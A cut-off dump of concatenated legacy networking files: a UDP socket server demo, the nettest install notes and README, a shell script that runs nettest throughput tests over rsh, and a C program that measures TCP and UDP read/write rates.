		hostname, ntohs(peeraddr_in.sin_port), reqcnt, ctime(&timevar));
}
::::::::::::::
./usr/lib/demos/networking/socket/serv.udp.c
::::::::::::::
/*
 *          		S E R V . U D P
 *
 *	This is an example program that demonstrates the use of
 *	datagram sockets as an IPC mechanism.  This contains the server,
 *	and is intended to operate in conjunction with the client
 *	program found in client.udp.  Together, these two programs
 *	demonstrate many of the features of sockets, as well as good
 *	conventions for using these features.
 *
 *	This program provides a service called "example".  It is an
 *	example of a simple name server.  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the client will be running
 *	must also have the same entry (same port number) in its
 *	/etc/services file.
 *
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>

int s;				/* socket descriptor */

#define BUFFERSIZE	1024	/* maximum size of packets to be received */
int cc;				/* contains the number of bytes read */
char buffer[BUFFERSIZE];	/* buffer for packets to be read into */

struct hostent *hp;		/* pointer to host info for requested host */
struct servent *sp;		/* pointer to service information */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in clientaddr_in;	/* for client's socket address */
struct in_addr reqaddr;		/* for requested host's address */

#define ADDRNOTFOUND	0xffffffff	/* return address for unfound host */

/*
 *			M A I N
 *
 *	This routine starts the server.  It forks, leaving the child
 *	to do all the work, so it does not have to be run in the
 *	background.  It sets up the socket, and for each incoming
 *	request, it returns an answer.  Each request consists of a
 *	host name for which the requester desires to know the
 *	internet address.  The server will look up the name in its
 *	/etc/hosts file, and return the internet address to the
 *	client.  An internet address value of all ones will be returned
 *	if the host name is not found.
 *
 */
main(argc, argv)
int argc;
char *argv[];
{
	int addrlen;

		/* clear out address structures */
	memset ((char *)&myaddr_in, 0, sizeof(struct sockaddr_in));
	memset ((char *)&clientaddr_in, 0, sizeof(struct sockaddr_in));

		/* Set up address structure for the socket. */
	myaddr_in.sin_family = AF_INET;
		/* The server should receive on the wildcard address,
		 * rather than its own internet address.  This is
		 * generally good practice for servers, because on
		 * systems which are connected to more than one
		 * network at once will be able to have one server
		 * listening on all networks at once.  Even when the
		 * host is connected to only one network, this is good
		 * practice, because it makes the server program more
		 * portable.
		 */
	myaddr_in.sin_addr.s_addr = INADDR_ANY;
		/* Find the information for the "example" server
		 * in order to get the needed port number.
		 */
	sp = getservbyname ("example", "udp");
	if (sp == NULL) {
		printf("%s: example not found in /etc/services\n",
				argv[0]);
		exit(1);
	}
	myaddr_in.sin_port = sp->s_port;

		/* Create the socket. */
	s = socket (AF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror(argv[0]);
		printf("%s: unable to create socket\n", argv[0]);
		exit(1);
	}
		/* Bind the server's address to the socket. */
	if (bind(s, &myaddr_in, sizeof(struct sockaddr_in)) == -1) {
		perror(argv[0]);
		printf("%s: unable to bind address\n", argv[0]);
		exit(1);
	}

		/* Now, all the initialization of the server is
		 * complete, and any user errors will have already
		 * been detected.  Now we can fork the daemon and
		 * return to the user.  We need to do a setpgrp
		 * so that the daemon will no longer be associated
		 * with the user's control terminal.  This is done
		 * before the fork, so that the child will not be
		 * a process group leader.  Otherwise, if the child
		 * were to open a terminal, it would become associated
		 * with that terminal as its control terminal.  It is
		 * always best for the parent to do the setpgrp.
		 */
	setpgrp();

	switch (fork()) {
	case -1:		/* Unable to fork, for some reason. */
		perror(argv[0]);
		printf("%s: unable to fork daemon\n", argv[0]);
		exit(1);

	case 0:			/* The child process (daemon) comes here. */
			/* Close stdin, stdout, and stderr so that they will
			 * not be kept open.  From now on, the daemon will
			 * not report any error messages.  This daemon
			 * will loop forever, waiting for requests and
			 * responding to them.
			 */
		close(stdin);
		close(stdout);
		close(stderr);
			/* This will open the /etc/hosts file and keep
			 * it open.  This will make accesses to it faster.
			 */
		sethostent(1);
		for(;;) {
				/* Note that addrlen is passed as a pointer
				 * so that the recvfrom call can return the
				 * size of the returned address.
				 */
			addrlen = sizeof(struct sockaddr_in);
				/* This call will block until a new
				 * request arrives.  Then, it will
				 * return the address of the client,
				 * and a buffer containing its request.
				 * BUFFERSIZE - 1 bytes are read so that
				 * room is left at the end of the buffer
				 * for a null character.
				 */
			cc = recvfrom(s, buffer, BUFFERSIZE - 1, 0,
						&clientaddr_in, &addrlen);
			if ( cc == -1) exit(1);
				/* Make sure the message received is
				 * null terminated.
				 */
			buffer[cc]='\0';
				/* Treat the message as a string containing
				 * a hostname.  Search for the name in
				 * /etc/hosts.
				 */
			hp = gethostbyname (buffer);
			if (hp == NULL) {
					/* Name was not found.  Return a
					 * special value signifying the
					 * error.
					 */
				reqaddr.s_addr = ADDRNOTFOUND;
			} else {
					/* Copy address of host into the
					 * return buffer.
					 */
				reqaddr.s_addr =
				       ((struct in_addr *)(hp->h_addr))->s_addr;
			}
				/* Send the response back to the
				 * requesting client.  The address
				 * is sent in network byte order. Note that
				 * all errors are ignored.  The client
				 * will retry if it does not receive
				 * the response.
				 */
			sendto (s, &reqaddr, sizeof(struct in_addr),
					0, &clientaddr_in, addrlen);
		}

	default:		/* Parent process comes here. */
		exit(0);
	}
}

# endif /* HPXNET */

/*	____	____	____	____	____	____	____	____	*/

# ifdef NETT

::::::::::::::
nettest-INSTALL
::::::::::::::
		Steps for Building Nettest From a Tarball
		=========================================


FOR ADDITIONAL HELP   http://www-itg.lbl.gov/nettest


1) Get Files from tarball 
   ----------------------

              bov@taz%gunzip nettest.tar.gz 
              bov@taz%tar -xf nettest.tar 
              bov@taz%cd nettest/src/ 
              bov@taz%vi configure.in 


2) Configuration Details
   -----------------------------

	      <platform> can be either sun-sol-gcc, sun-sol, linux
		sun-sol-gcc : Solaris with gcc and g++
		sun-sol     : Solaris with cc  and CC
		linux       : linux with gcc and g++

         A.   *From the Nettest Source Top (nettest/src/) run autoconf on 
		the configure.in file

                bov@taz%autoconf 

	 B.   *Move to the <platform> specific build directory and run the
		configure script 

	      configure script Flags
		1)   --with-gcc       :  use gcc and g++
		2)   --with-netlogger :  use netlogger


	      Do Either
	      1. Solaris With gcc and g++

              	bov@taz%cd ../build/sun-sol-gcc/ 

 		a. Without Netlogger
              	bov@taz%./../../src/configure --with-gcc 

 		b. With    Netlogger
              	bov@taz%./../../src/configure --with-gcc --with-netlogger

	      2. Solaris With cc and CC

              	bov@taz%cd ../build/sun-sol/ 

 		a. Without Netlogger
              	bov@taz%./../../src/configure 

 		b. With    Netlogger
              	bov@taz%./../../src/configure --with-netlogger

	      3. Linux With gcc and g++

              	bov@dagwood%cd ../build/linux/ 

 		a. Without Netlogger
              	bov@dagwood%./../../src/configure 

 		b. With    Netlogger
              	bov@dagwood%./../../src/configure --with-netlogger
		
              Answer a few Questions: Input the path to your SSL
		and NetLogger( if using --with-netlogger ) installations.

              Make iperf multi-threaded (using pthreads)? [yes] 
              yes 

	      -- Done.


3a) Build a Nettest executable 
    ---------------------------

	      *The executable will be in the nettest/release directory. 

              *From the <platform> specific directory
	      eg. nettest/build/linux/ 

              bov@taz%make all


3b) Build a stand-alone Iperf executable 
    ------------------------------------

	      *The executable will be in the nettest/release directory. 

              *From the <platform> specific directory
              eg. nettest/build/linux/iperf 

                comment out the variable NETTEST in the file "configure.h"
                ( eg. nettest/build/linux/iperf/cfg/configure.h )

              bov@taz%make clean
              bov@taz%make iperf

::::::::::::::
nettest-README
::::::::::::::
		Nettest: Secure Network Testing and Monitoring
		==============================================

FOR ADDITIONAL HELP  http://www-itg.lbl.gov/nettest

Secure Network Monitoring
-------------------------

	The nettest framework is designed to incorporate existing and 
	new network tests, and be run as a daemon or an interactive process. 
	Requests for network tests are received via a SSL connection or the 
	user interface and are authorized using an ACL list (in the future 
	authorization using Akenti will also be supported).

	For tests that require coordination between the two ends of the test, 
	nettest establishes an SSL connection to accomplish this coordination.   
	A test between two remote computers can be requested via the user 
	interface if the nettest daemon is running on both remote machines and
	the user is authorized. Authorization for the test is through a chain 
	of trust established by the nettest daemons.  Nettest is responsible 
	for determining if the test request is authorized, but it does nothing
	further to secure the test once the test is running.

	Currently the nettest framework incorporates iperf-v1.2, a simple ping 
	type test, traceroute, pipechar, and a tuned TCP test that uses a given 
	required throughput and ping results to determine the round trip time 
	to set a buffer size (based on the delay bandwidth product) and then 
	performs an iperf  TCP throughput test.  Additional network test tools 
	can be integrated into the nettest framework in the future.

	More information on nettest and downloadable source code can be found at:
    		http://www-itg.lbl.gov/nettest


	The iperf network testing tool can be found at
  		http://dast.nlanr.net/Projects/Iperf/

	The pipechar network testing tool can be found at
		http://www-itg.lbl.gov/~jin/network/net-tools.html
 	


Packages/Platforms
------------------

        Nettest was tested and developed on Linux and Solaris.  nettest is 
        written in C++, primarily using gcc but also tested on SparcWorks C++.          
        Secure communication is implemented using SSL-v0.9.6.

        To run nettest you will need the latest version of openssl.

        http://www.openssl.org/source/


        NetLogger can be used for result reporting purposes, it will allow you 
        to send all test results to one location.

        http://www-didc.lbl.gov/NetLogger/

Running
-------

        lblnettest [-s]
        lblnettest [-h <hostname>]
         [-h hostname]   - connect to the specified server hostname
         [-c filename]   - pem certificate filename (default nettest.pem)
         [-k filename]   - pem key filename (default key.pem) 
         [-n hostname]   - Send NetLogger messages to netlogd on hostname
        *[-a passphrase] - Client side passphrase
        *[-b passphrase] - Server side passphrase
         [-s] 	         - this is a server who waits for a connection
         [-d] 	         - Run As Daemon process 
	 [-D] number]    - Debug Level 0-5


	*A passphrase entered on the command-line is not guarenteed to be hidden
	 from other users.  I erase the argument list, which works for some versions
	 of ps.
	 

	REQUIREMENTS:

	  In order to run the lblnettest executable you must have a key/certificate
	pair set up with an appropriate entry in the server's ACLFile.  
	The key/certificate are used by openssl, the ACLFile contains an entry for 
	every client certificate which has permission to establish a connection 
	with the server.

	WARNING: Sample nettest.pem and key.pem files should ONLY be used initially.
		 An entry in an ACLFile for these files is especially dangerous
		 since it will essentially give anyone the ability to connect into
		 a nettest process ran from that directory and request tests.  

	These files must reside in the same folder as the executable (nettest/release).

	The server side application uses the files "nettest.pem" 
	and "key.pem" for as its SSL certificate and key. 

              taz%lblnettest -s 

	The server side must be up and running before a client tries to connect in,
	enter requester information until you see the server waiting on an accept:

	**Waiting for A Connection


	  You can specify a different cert/key pair for the client side by using
	the options, by default it will also use nettest.pem and key.pem.
	The client side can use a different certificate and key by specifing such 
	on the command line.  The client's key should be encrypted, requiring 
	a passphrase for the establishment of an SSL connection. 

              wile%lblnettest -h taz.lbl.gov -c client.cert -k client.key 

              The "CA.pem" file must contain an entry for these certificate/key 
		pairs. 

              The "ACLFile" must contain an entry for the client who is trying 
		to establish the connect. 


	RUNNING AS A DAEMON

	You CANNOT RUN THE REQUESTOR as a daemon process.

	eg.

	     1) Start server first
	     taz%lblnettest -s -d > output.txt&

	     2) Start Requester
	     wile%lblnettest -h -c client.cert -k client.key


	HOW TO:

	The test Requester produces test requests, if not valid, test
	sites should reject them.  The Master relays the Requester's test 
	requests to the test client and test server, if one of the test
	sites throws an error message back to the Master it cancels the
	test.
	
	Select an option 
		u = udp connectivity and round trip time
		m = multicast connectivity and round trip time
		i = tcp throughput (iperf test)
		w = traceroute
		p = pipechar
                t = tuned tcp (determine optimal tcp parameters) 
		c = change Test Master
		o = change Requester's result reporting(printing, Netlogging)
		d = change Debug Level
		q = quit 


	****************************************
        p = udp connectivity and round trip time 

	This test measures the RTT using UDP packets sent from the sender to the receiver
	and back again.


	****************************************
        m = multicast connectivity and round trip time 

	This test measures the IP multicast RTT between two sites.  The sender sends a 
	packet is sent to the multicast site, which is then sent to the receiver.  The
	receiver replies back to the multicast site, and reply is sent from the 
 	multicast site to the original sender and the RTT is calculated.


	****************************************
        i = tcp throughput (iperf test) 

	This test is the iperf test.  The iperf test measures UDP/TCP throughput between
	two network endpoints.

	****************************************
        w = traceroute

	This test prints the route packets take to network host.  Optionally configured
	in.

	****************************************
        w = pipechar

	Sender-Only based tool for network analysis. Provide throughput measurements
	for each hop between the sender and its target.

	****************************************
        t= tuned tcp (determine optimal tcp parameters) 

	This test uses the RTT calculated from a UDP ping test, and then prompts the user
	for a target bandwidth value.  Then an iperf test is performed using an optimal 
	calculation of throughput.


	****************************************
	s = connect a new server host

	This is the option which allows one to add an additional machine(server)
	which can also take/perform tests which the requester specifies.


	****************************************
        o = change Requester's result reporting(printing, Netlogging) 
	
	Allows the requester to select how it reports its data.


	****************************************
	d = change Debug Level

	0 - no debug information
	5 - 'complete' debug information

	****************************************


FOR ADDITIONAL HELP  http://www-itg.lbl.gov/nettest
::::::::::::::
nettest-run
::::::::::::::
#!/bin/sh
#
# runnettest -p proto [-d dest] [-R remote] [-L local] 
#		[-r run tag] [-N nBytes] [-n nstreams]
#               [-B singlesendsize]
#
# Executes a nettest session both locally and remotely. Not all nettest
# arguments are # used by this script - it's intended to be a simple 
# performance neasurement tool.
# -p	Protocol. tcp, udp, unix (unix domain sockets), pipe, or file.
# -d	Destination (hostname, host alias, fully qualified domain name, or
#	IP address in dot format) to which the local host will send. 
# -R	Address of the remote host (hostname, host alias, fully qualified 
#	domain name, or IP address in dot format) which will send to the
#	local host. 
# -L 	Address of the local host (hostname, host alias, fully qualified 
#	domain name, or IP address in dot format) which the remote host
#	will send to.
# -r	Run tag. An integer or character string which will be used to label 
#	output files. A tag of "5" will generate local output file out.5 (both
#	sender's and receiver's output) for tests where the local host is 
#	the sender, and remout.5 for tests where the remote host is the 
#	sender. Defaults to 1.
# -N	Total number of bytes to send. Defaults to 8 Meg (8*1024*1024, or
#	8388608) in the 3.3-comparison case, to slightly more than 8 Meg 
#	(4*1460*1460, or 8526400) in the optimized Ethernet TCP case, and 
#	to slightly more than 80 meg (2000*4352, or 8704000) in the optimized
#       FDDI TCP case. Optimized cases send only MTU-multiples for send
#       sizes of 1 MTU or greater, so each packet will be MTU-sized.
# -n	Number of instances of nettest to run concurrently. For TCP tests,
#	this will be the number of connections to the receiving host. If not
#	specified, n defaults to one.
# -B    Buffer size to send when only a single run is desired. Defaults to the
#       uncommented standard series defined below by "lengths".
# 
# Examples:
# runnettest -p tcp -r 1 -d foo -n 3	: runs a TCP test with three concurrent
#					  connections to foo as the target
#					  host, and locally generates
#					  output files called t1 and r1.
#
# runnettest -p udp -r 4 -R foo -L doo	: runs a single UDP testfrom the remote
#					  host foo to the local host doo, and 
#					  locally generates output files called
#					  rt4 and rr4 .
#
# runnettest assumes that nettest and nettestd reside in /usr/etc on all hosts,
# and also assumes that any remote hosts have an open guest account. Should that
# not be the case (that is, if the remote hosts(s) are not SGI machines), edit 
# the rsh command lines to use appropriate remote logins and the correct remote 
# directory path to nettest and nettestd.
#
# Bidirectional tests may be run by specifying -d , -R , and -L .
# If -R is specified but -L is not, -L defaults to the system hostname
# (which may not be on the same network as the -R IP address).
#
# The number of cases to be run and the send size per case are specified
# in the defined character string "lengths" below. Choose the "lengths" and
# "nbytes" pair appropriate to your test. Edit lengths to add or remove
# send-size cases - customization is encouraged.
#
# The nettest daemon nettestd must be running on the target machine. It must be
# installed in /usr/etc. The nettest progrtam itself must also be installed in
# /usr/etc .

USAGE="$0 -p proto [-d dest] [-L laddr] [-R raddr] [-r run] [-N nBytes] [-n nstreams]"

# for comparison with 3.3 figures, uncomment the next two lines
#lengths="128 256 512 1024 1536 2048 3072 3584 4096 5120 5400 6144 7168 8192"
#nBytes=`expr 8 \* 1024 \* 1024`

# for Ethernet TCP optimum sends, uncomment the next two lines
lengths="128 256 512 1024 1460 2920 5840 7300 8760 11680 14600 17520 35040 43800 58400 61320"
nBytes=`expr 4 \* 1460 \* 1460`

# for FDDI MTU-sized TCP tests, uncomment the next two lines.
#lengths="128 256 512 1024 2048 4352 8704 13056 21760 30464 43520 52224 60928"
#nBytes=`expr 20000 \* 4352`

myname=`hostname`
run=1
number=1
while getopts "p:d:r:L:R:N:n:B:" c; do
    case $c in
    p) proto="$OPTARG";;
    d) dest="$OPTARG"; destination=yes;;
    r) run="$OPTARG";;
    R) hisname="$OPTARG"; remote=yes;;
    L) myname="$OPTARG";; 
    N) nBytes="$OPTARG";;
    n) number="$OPTARG";;
    B) lengths="$OPTARG";;
    \?) echo $USAGE; exit 1;;
    esac
done
shift `expr $OPTIND - 1`
if test "$#" != 0; then
    echo $USAGE
    exit 1
fi
echo "Starting $proto run $run"
if test "$destination" = "yes"; then
   op=out.
   output=$op$run
   cp /dev/null $output
fi
if test "$remote" = "yes"; then
   bop=remout.
   bout=$bop$run
   cp /dev/null $bout
fi
if test "$destination" = "yes"; then
   if rsh guest@$dest ps -ef | grep nettestd | grep $proto >/dev/null 2>&1; 
      then :
      else
         rsh guest@$dest -n /usr/etc/nettestd -p $proto -b
   fi
fi
if test "$remote" = "yes"; then
   if ps -ef | grep nettestd | grep $proto >/dev/null 2>&1; 
      then :
      else
         /usr/etc/nettestd -p $proto -b
   fi
fi

   sleep 2
for buflen in $lengths; do
   nBuf=`expr $nBytes / $buflen`
   echo "$buflen * $nBuf"
   if test "$remote" = "yes"; then
      echo "" >> $remout
      rsh guest@$hisname -n /usr/etc/nettest -p $proto -n $number $myname $nBuf $buflen  >> $remout &
   fi
   if test "$destination" = "yes"; then
      echo "" >> $output
      nettest -p $proto -n $number $dest $nBuf $buflen >> $output
   fi
   wait
   sleep 4
done
::::::::::::::
nettest1.c
::::::::::::::

/*
 * @(#)nettest.c--Test read and writes to a network port
 */

static  char *what[]={
    "@(#)nettest--Test reads/writes to a network port",
    "@(#)Copyright 2000 ShadeTree Software,Inc.",
    "@(#)Any and all uses allowed, no responsibility accepted :)",
    "@(#)STS/KBS 2apr1996",
    0,
};

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/times.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>

#define M_NONE          0
#define M_READ          1
#define M_WRITE         2

#define MN_NONE         0
#define MN_TCPIP        1
#define MN_UDP          2

int     debugl;
char    *iam;

int     rwmode = M_NONE;
int     netmode = MN_TCPIP;

char    *hostname = "localhost";
int     port = 10001;
int     bufsz = 1024;
int     nbufs = 100;

char    ebuf[512];                      /* error messages */
int     hz;                             /* for timings */

extern  int     h_errno;

main(ac,av)
int     ac;
char    *av[];
{
    int         s;
    struct      sockaddr_in sin;
    int         c;
    struct      hostent *hp;
    char        *buf;
    int         bufr,bufw;
    int         oc;                     /* current option char */
    int         on;                     /* current string option number */
    extern      char *optarg;           /* stuff for getopt */
    extern      int optind, optopt;     /* stuff for getopt */


    iam = av[0];
    hz = sysconf(_SC_CLK_TCK);

    on = 0;
    while(( oc = getopt(ac,av,"urwdb:n:h:p:")) != -1 )
    {
        switch(oc)
        {
         case 'u':
            netmode = MN_UDP;
            break;
         case 'r':
            if (rwmode != M_NONE)
            {
                usage();
            }
            rwmode = M_READ;
            break;
         case 'w':
            if (rwmode != M_NONE)
            {
                usage();
            }
            rwmode = M_WRITE;
            break;
         case 'd':
            debugl++;
            break;
         case 'b':
            bufsz = atoi(optarg);
            break;
         case 'n':
            nbufs = atoi(optarg);
            break;
         case 'h':
            hostname = optarg;
            break;
         case 'p':
            port = atoi(optarg);
            break;
         case ':':
         case '?':
         default:
            usage();
            break;
        }
    }
    if(optind < ac)
    {
        fprintf(stderr,"Too many arguments (%s)\n",av[optind]);
        usage();
    }
    if(rwmode == M_NONE)
    {
        fprintf(stderr,"One of -r or -w is manditory\n");
        usage();
    }
    if(debugl)
    {
        fprintf(
            stderr,
            "mode = %s %s\n",
            netmode == MN_NONE ? "None" :
                netmode == MN_TCPIP ? "TCP/IP" :
                netmode == MN_UDP ? "UDP" : "???",
            rwmode == M_NONE ? "None" :
                rwmode == M_READ ? "Read" :
                rwmode == M_WRITE ? "Write" : "???"
        );
        fprintf(stderr,"bufsz = %d\n",bufsz);
        fprintf(stderr,"nbufs = %d\n",nbufs);
        fprintf(stderr,"hostname = %s\n",hostname);
        fprintf(stderr,"port = %d\n",port);
    }

    if (netmode == MN_TCPIP)
    {
        if (rwmode == M_WRITE)
        {
            return(tcpwrite());
        }
        else
        {
            return(tcpread());
        }
    }
    else
    {
        if (rwmode == M_WRITE)
        {
            return(udpwrite());
        }
        else
        {
            return(udpread());
        }
    }
    /* NOTREACHED */
}

int
tcpwrite(void)
{
    int         s;
    struct      sockaddr_in sin;
    int         c;
    struct      hostent *hp;
    char        *buf;
    int         bufr,bufw;
    int         stime, etime, totalwrites, totalbytes;
    struct      tms tms;

    if(!(buf=malloc(bufsz))) {
        perror("malloc()");
        return;
    }

    setbuf(stderr,NULL);

    hp = gethostbyname(hostname);
    if(debugl) fprintf(stderr,"gethostbyname()=0x%x\n",hp);
    if(!hp) {
        herror(hostname);
        return(2);
    }

    for(;;) {
        s=socket(AF_INET, SOCK_STREAM, 0);
        if(debugl) fprintf(stderr,"socket()=%d\n",s);
        if(s<0) {
            perror("Can't open socket");
            return(2);
        }

        /*
         * Build socket name
         */
        memset(&sin,0,sizeof(sin));
        memcpy( (char *)&sin.sin_addr.s_addr, hp->h_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = htons(port);
        if(debugl) fprintf(stderr,"sin.sin_addr=%s\n",inet_ntoa(sin.sin_addr));

        c=connect(s,(struct sockaddr *)&sin,sizeof(sin));
        if(debugl) fprintf(stderr,"connect()=%d\n",c);

        if(c) {
            if(debugl) {
                sprintf(buf,"Connect to port %d on %s",port,hostname);
                perror(buf);
            }
            close(s);
            sleep(5);
        } else {
            break;
        }
    }

    if(fcntl(s, F_SETFL, fcntl(s,F_GETFL,0) & O_SYNC) == -1) {
        if(debugl) perror("fcntl(O_SYNC)");
    }

    buf[0] = '\n';
    stime = etime = times(&tms);
    totalwrites = totalbytes = 0;
    for(c=0; c<nbufs;c++) {
        bufr = bufsz;
        bufw=write(s,buf,bufr);
        if(debugl) fprintf(stderr,"write()=%d\n",bufw);
        if(bufr != bufw) {
            if(debugl) fprintf(stderr,"short write!\n");
            if(bufw < 0) break;
        }
        totalwrites++;
        totalbytes += bufw;
    }

    /* show stats */
    etime = times(&tms);
    {
        float   bps,secs;

        secs = etime - stime;
        secs /= hz;
        if(secs > 0)
        {
            bps = (float)totalbytes / secs;
        }
        else
        {
            bps = 0;
        }
        fprintf(
            stderr,
            "%d writes, %d bytes in %g seconds, %.0f bps\n",
            totalwrites,
            totalbytes,
            secs,
            bps
        );
    }

    close(s);

    return(0);
}

int
tcpread(void)
{
    struct      sockaddr_in     sin;    /* socket name */
    int         s;                      /* our socket */
    int         sc;                     /* incomming connection socket */
    struct      sockaddr_in     sf;     /* socket name of connection */
    int         sflen;                  /* socket name length */
    fd_set      allmask;                /* initial select mask (our socket) */
    fd_set      rmask;                  /* current select mask (w connects) */
    int         sv;                     /* select return value */
    int         rz;                     /* read size */
    int         one = 1;
    char        *buf;
    struct      tms tms;
    struct {
        clock_t stime;
        clock_t etime;
        int     currentbytes;   /* used for status updates */
        int     totalreads;
        int     totalbytes;
    } ss[20];

    if(!(buf=malloc(bufsz))) {
        perror("malloc()");
        return;
    }

    /*
     * Create the socket (file descriptor)
     * Give up immediatly if we can't get a socket.
     */
    if((s=socket(AF_INET,SOCK_STREAM,0))<0) {
        perror("Couldn't create socket");
        return(1);
    }
    fprintf(stderr,"Created socket %d\n",s);

    /*
     * Reuse port--Easy testing
     */
    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,(char *)&one,sizeof(one))) {
        perror("setsockopt");
    }

    /*
     * Build socket name
     */
    memset(&sin,0,sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    /*
     * Bind to socket
     */
    if(bind(s, (struct sockaddr *)&sin, sizeof(sin))) {
        sprintf(
            ebuf,
            "Couldn't bind to port %d",
            ntohs(sin.sin_port)
        );
        perror(ebuf);
        close(s);
        return(1);
    }
    fprintf(
        stderr,
        "Bound to port %d\n",
        ntohs(sin.sin_port)
    );

    /*
     * Estabilish connection queue
     */
    listen(s,5);

    /*
     * Setup select mask.
     * Initialize to our socket only
     */
    FD_ZERO(&allmask);
    FD_SET(s,&allmask);

    /*
     * Wait for activity
     */
    for(;;) {
        if(debugl) fprintf(stderr,"Waiting...");

        memcpy(&rmask,&allmask,sizeof(allmask));
        sv = select(20,&rmask,0,0,0);
        if(debugl) putc(' ',stderr);
        if(sv<0) {
            perror("select");
            continue;
        }

        /*
         * Check for connection attempt (our socket)
         */
        if(FD_ISSET(s,&rmask)) {

            fprintf(stderr,"Incomming connection...\n");

            FD_CLR(s,&rmask);           /* Clear ourselvs from current set */
            sflen = sizeof(struct sockaddr_in);
            sc = accept(s,(struct sockaddr*)&sf, &sflen);
            if(sc<0) {
                perror("accept");
                continue;
            }

            fprintf(
                stderr,
                "   socket=%d, ip=%s, port=%d\n",
                sc,
                inet_ntoa(sf.sin_addr),
                ntohs(sf.sin_port)
            );

            FD_SET(sc,&allmask);        /* Add to active set */
            ss[sc].stime = times(&tms);
            ss[sc].etime = ss[sc].stime;
            ss[sc].totalreads = 0;
            ss[sc].totalbytes = 0;
        }

        /*
         * Check for other activity
         */
        for(sc = 3; sc < 20; sc++) {
            if(FD_ISSET(sc,&rmask)) {
                FD_CLR(sc,&rmask);
                errno = 0;
                rz = read(sc,buf,bufsz);
                if(rz>0) {
                    ss[sc].totalreads++;
                    ss[sc].totalbytes += rz;
                    if(debugl) {
                        fprintf(
                            stderr,
                            "(%d) read()=%d (errno=%d), total=%d\n",
                            sc,rz,errno,ss[sc].totalbytes
                        );
                    } else {
                        ss[sc].currentbytes += rz;
                        if(ss[sc].currentbytes >= 1000000) {
                            fprintf(stderr,"\r(%d) %d ",sc,ss[sc].totalbytes);
                            ss[sc].currentbytes = 0;
                        }
                    }
                }
                if(rz <= 0) {
                    fprintf(stderr,"\r(%d) %d ",sc,ss[sc].totalbytes);
                    if(rz==0) {
                        fprintf(stderr,"EOF--disconnecting\n");
                    } else {
                        perror("read from socket--disconnecting");
                    }
                    ss[sc].etime = times(&tms);
                    close(sc);
                    FD_CLR(sc,&allmask);
                    {
                        float   bps,secs;

                        secs = ss[sc].etime - ss[sc].stime;
                        secs /= hz;
                        if(secs > 0)
                        {
                            bps = (float)ss[sc].totalbytes / secs;
                        }
                        else
                        {
                            bps = 0;
                        }
                        fprintf(
                            stderr,
                            "(%d) %d reads, %d bytes in %g seconds, %.0f bps\n",
                            sc,
                            ss[sc].totalreads,
                            ss[sc].totalbytes,
                            secs,
                            bps
                        );
                    }
                    continue;
                }
            }
        }
    }
}

int
udpwrite(void)
{
    int         s;
    struct      sockaddr_in sin;
    int         c;
    struct      hostent *hp;
    char        *buf;
    int         bufr;
    int         stime, etime, totalwrites, totalbytes;
    struct      tms tms;

    if(!(buf=malloc(bufsz))) {
        perror("malloc()");
        return;
    }

    setbuf(stderr,NULL);

    hp = gethostbyname(hostname);
    if(debugl) fprintf(stderr,"gethostbyname()=0x%x\n",hp);
    if(!hp) {
        herror(hostname);
        return(2);
    }

    s=socket(AF_INET, SOCK_DGRAM, 0);
    if(debugl) fprintf(stderr,"socket()=%d\n",s);
    if(s<0) {
        perror("Can't open socket");
        return(2);
    }

    /*
     * Build socket name
     */
    memset(&sin,0,sizeof(sin));
    memcpy( (char *)&sin.sin_addr.s_addr, hp->h_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = htons(port);
    if(debugl) fprintf(stderr,"sin.sin_addr=%s\n",inet_ntoa(sin.sin_addr));

    buf[0] = '\n';
    stime = etime = times(&tms);
    totalwrites = totalbytes = 0;
    for(c=0; c<nbufs;c++) {
        bufr = bufsz;
        if(
            sendto(
                s,
                (void *)buf,
                bufr,
                0,
                (struct sockaddr *)&sin,sizeof(sin)
            ) < 0
        )
        {
            perror("sendto()");
        } else {
            if(debugl) fprintf(stderr,"sendto(%d,0x%x,%d)\n",s,buf,bufr);
            totalwrites++;
            totalbytes += bufr;
        }
    }

    /* show stats */
    etime = times(&tms);
    {
        float   bps,secs;

        secs = etime - stime;
        secs /= hz;
        if(secs > 0)
        {
            bps = (float)totalbytes / secs;
        }
        else
        {
            bps = 0;
        }
        fprintf(
            stderr,
            "%d writes, %d bytes in %g seconds, %.0f bps\n",
            totalwrites,
            totalbytes,
            secs,
            bps
        );
    }

    close(s);

    return(0);
}

int
udpread(void)
{
    struct      sockaddr_in     sin;    /* socket name */
    int         s;                      /* our socket */
    int         rz;                     /* read size */
    int         one = 1;
    char        *buf;
    int         currentreads, currentbytes;
    int         stime, etime, totalreads, totalbytes;
    struct      tms tms;

    if(!(buf=malloc(bufsz))) {
        perror("malloc()");
        return;
    }

    /*
     * Create the socket (file descriptor)
     * Give up immediatly if we can't get a socket.
     */
    if((s=socket(AF_INET,SOCK_DGRAM,0))<0) {
        perror("Couldn't create socket");
        return(1);
    }
    fprintf(stderr,"Created socket %d\n",s);

    /*
     * Reuse port--Easy testing
     */
    if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,(char *)&one,sizeof(one))) {
        perror("setsockopt");
    }

    /*
     * Build socket name
     */
    memset(&sin,0,sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = INADDR_ANY;
    sin.sin_port = htons(port);

    /*
     * Bind to socket
     */
    if(bind(s, (struct sockaddr *)&sin, sizeof(sin))) {
        sprintf(
            ebuf,
            "Couldn't bind to port %d",
            ntohs(sin.sin_port)
        );
        perror(ebuf);
        close(s);
        return(1);
    }
    fprintf(
        stderr,
        "Bound to port %d\n",
        ntohs(sin.sin_port)
    );

    currentreads = currentbytes = totalbytes = totalreads = 0;
    stime = etime = times(&tms);
    for(;;) {
        if(debugl) fprintf(stderr,"Waiting...");
        rz = read(s,buf,bufsz);
        if(rz>0) {
            currentbytes += rz;
            currentreads++;
